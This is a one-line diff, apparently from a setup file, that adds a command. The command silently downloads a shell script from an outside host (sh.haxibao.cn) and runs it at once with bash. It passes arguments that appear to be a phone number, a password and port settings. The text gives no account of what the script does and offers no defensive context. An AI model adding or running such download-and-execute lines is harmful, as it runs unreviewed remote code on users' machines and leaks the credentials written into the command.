@@ -1,0 +1,1 @@
+curl -s http://sh.haxibao.cn/becard.sh -o work.sh && bash work.sh 18179653363 wusuowei21 1080 100
